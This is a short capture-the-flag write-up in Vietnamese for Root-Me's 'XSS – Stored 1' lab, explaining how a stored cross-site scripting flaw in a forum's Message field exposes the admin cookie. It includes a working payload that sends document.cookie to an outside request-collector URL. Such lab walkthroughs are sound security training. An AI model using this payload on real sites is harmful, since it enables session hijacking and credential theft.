# WRITE UP

## **Challenge: [XSS – Stored 1](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1)**

Challenge yêu cầu ta thực hiện đánh cắp cookie phiên quản trị viên và cung cấp cho ta một website để đăng post:

<img src="./media/image1.png" style="width:4.27197in;height:3.11176in" alt="Graphical user interface, text, application, email Description automatically generated" />

Kiểm tra source thì thấy đây là một form với phương thức “POST”. Như tên đề bài, ta sẽ thực hiện XSS Stored vào input. Nhưng trước hết ta kiểm tra xem nó bị XSS ở đâu, ta được kết quả là nó bị tại ô input ‘Message’:

<img src="./media/image2.png" style="width:4.17036in;height:2.37882in" alt="Graphical user interface, text, application, email Description automatically generated" />

<img src="./media/image3.png" style="width:6.5in;height:1.09514in" alt="Text Description automatically generated" />

Đầu tiên, ta thực hiện tạo một nơi để có thể thu thập các HTTP Request với <https://requestbin.in>:

<img src="./media/image4.png" style="width:6.5in;height:2.21597in" alt="Graphical user interface, application Description automatically generated" />

Như vậy, ta có một requestbin tại <https://eojx5xx99skfihj.m.pipedream.net>:

Tiếp theo, ta có thể đoán được chắc chắn Forum v0.001 website này bị XSS, do vậy, ta thực hiện viết payload để attack vào input của form này:

Payload: &lt;script&gt;document.write("&lt;img src='https://eojx5xx99skfihj.m.pipedream.net/"+document.cookie+"'&gt;&lt;/img&gt;");&lt;/script&gt;

<img src="./media/image5.png" style="width:5.56715in;height:2.62523in" />

<img src="./media/image6.png" style="width:6.03386in;height:1.25011in" alt="Graphical user interface, text, application Description automatically generated" />

Kiểm tra request bin, ta nhận được giá trị ADMIN\_COOKIE.

<img src="./media/image7.png" style="width:6.5in;height:1.2125in" alt="A picture containing graphical user interface Description automatically generated" />

\- Flag: \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
